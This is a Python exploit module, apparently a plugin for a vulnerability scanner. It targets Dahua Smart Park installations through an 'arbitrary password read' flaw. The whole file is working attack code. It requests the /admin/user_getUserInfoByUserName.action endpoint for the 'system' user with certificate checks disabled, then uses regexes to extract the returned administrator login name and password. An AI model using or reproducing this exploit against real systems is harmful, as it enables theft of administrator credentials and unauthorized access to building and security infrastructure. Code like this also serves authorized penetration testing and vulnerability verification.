#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '大华智慧园区 任意密码读取',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/admin/user_getUserInfoByUserName.action?userName=system'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,allow_redirects=True,timeout=5,verify=False)
    if res.status_code == 200 and "loginPass" in res.text:
      res.close()
      loginname=re.findall(r'loginName":"(.*?)"', res.text, re.DOTALL)[0]
      loginpass=re.findall(r'loginPass":"(.*?)"', res.text, re.DOTALL)[0]
      ret['huixian'] = 'name: '+loginname+'\n'+'pass: '+loginpass
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret